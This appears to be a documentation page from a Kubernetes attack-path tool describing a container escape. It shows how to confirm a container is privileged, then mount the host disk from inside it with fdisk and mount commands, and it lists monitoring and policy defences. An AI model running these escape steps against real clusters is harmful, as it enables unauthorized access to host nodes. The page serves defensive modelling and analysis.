# CE_PRIV_MOUNT

Mount the host disk and gain access to the host via arbitrary filesystem write

| Source                                    | Destination                           | MITRE                            |
| ----------------------------------------- | ------------------------------------- |----------------------------------|
| [Container](../vertices/CONTAINER.md) | [Node](../vertices/NODE.md) | [Escape to Host, T1611](https://attack.mitre.org/techniques/T1611/) |

## Details

A container running with `privileged: true` disables almost all the container isolation mechanisms. As such an attacker can trivially gain access to the host's resources, including the disk, to escape the container. In this attack, we simply list the disks on the host machine, mount them into the container and exploit a privileged file write to gain execution on the host.

## Prerequisites

Execution within a privileged container process.

See the [example pod spec](../../test/setup/test-cluster/attacks/CE_PRIV_MOUNT.yaml).

## Checks

From within a running container, determine whether it is running with as privileged by examining capabilities:

```bash
# Check the current process' capabilities
cat /proc/self/status | grep CapEff
# CapEff: 000001ffffffffff

# Decode the capabilities (on current box or offline) and check for CAP_SYS_ADMIN
# NOTE: can install capsh via apt-get update && apt-get install libcap2-bin
capsh --decode=000001ffffffffff | grep cap_sys_admin
```

Check that the host disks are visible to our container process:

```bash
apt update && apt install fdisk
fdisk -l 
# -> /dev/vda1
```

## Exploitation

Mount the disks into the container

```bash
mkdir -p /mnt/hostfs
mount /dev/vda1 /mnt/hostfs
ls -lah /mnt/hostfs/
```

With the disk now writeable from the container, follow the steps in [EXPLOIT_HOST_WRITE](./EXPLOIT_HOST_WRITE.md#Exploitation).

## Defences

### Monitoring

+ Monitor `mount` events originating from containers
+ See [EXPLOIT_HOST_WRITE](./EXPLOIT_HOST_WRITE.md#Defences)

### Implement security policies

Use a pod security policy or admission controller to prevent or limit the creation of pods with `privileged` enabled.

### Least Privilege

Avoid running containers as the root user. Specify an unprivileged user account using the `securityContext`.

## Calculation

+ [EscapePrivMount](../../pkg/kubehound/graph/edge/escape_priv_mount.go)

## References:

+ [HackTricks Docker Breakout](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)

